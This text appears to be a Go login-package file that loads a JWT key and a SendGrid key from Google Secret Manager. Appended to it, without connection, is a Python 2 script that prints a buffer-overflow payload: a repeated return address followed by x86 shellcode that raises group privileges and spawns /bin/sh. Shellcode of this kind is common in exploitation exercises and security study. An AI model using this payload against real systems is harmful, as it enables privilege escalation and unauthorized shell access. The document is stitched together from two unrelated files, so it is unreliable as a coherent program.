package login

import (
	"context"

	secretmanager "cloud.google.com/go/secretmanager/apiv1"
	secretmanagerpb "google.golang.org/genproto/googleapis/cloud/secretmanager/v1"
)

var jwtKeyResourceID = "projects/980046983693/secrets/jwt_encryption_key/versions/1"
var sendGridId = "projects/980046983693/secrets/sendgrid_key/versions/1"

func getJwtSecret() ([]byte, error) {
	ctx := context.Background()
	client, err := secretmanager.NewClient(ctx)
	if err != nil {
		return nil, err
	}
	// Build the request.
	req := &secretmanagerpb.AccessSecretVersionRequest{
		Name: jwtKeyResourceID,
	}
	// Call the API.
	result, err := client.AccessSecretVersion(ctx, req)
	if err != nil {
		return nil, err
	}
	return []byte(string(result.Payload.Data)), nil
}

func getEmailSecret() (string, error) {
	ctx := context.Background()
	client, err := secretmanager.NewClient(ctx)
	if err != nil {
		return "", err
	}
	// Build the request.
	req := &secretmanagerpb.AccessSecretVersionRequest{
		Name: sendGridId,
	}
	// Call the API.
	result, err := client.AccessSecretVersion(ctx, req)
	if err != nil {
		return "", err
	}
	return string(result.Payload.Data), nil
}

#!/usr/bin/env python2

print("\x34\x84\x04\x08" * 21 + "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + "\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + "\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")